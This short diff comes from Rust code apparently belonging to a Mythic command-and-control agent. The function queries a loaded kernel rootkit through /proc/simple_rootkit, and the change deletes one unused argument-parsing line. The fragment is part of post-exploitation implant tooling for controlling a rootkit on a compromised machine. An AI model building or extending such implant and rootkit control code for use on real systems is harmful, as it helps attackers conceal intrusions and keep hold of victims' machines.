@@ -113,8 +113,6 @@ pub fn get_rootkit_status(task: &AgentTask) -> Result<serde_json::Value, Box<dyn
             "Rootkit module not loaded or /proc/simple_rootkit not available"
         ));
     }
-
-    let _args: EmptyArgs = serde_json::from_str(&task.parameters)?;
     
     match send_rootkit_command("status") {
         Ok(response) => Ok(mythic_success!(task.id, response)),
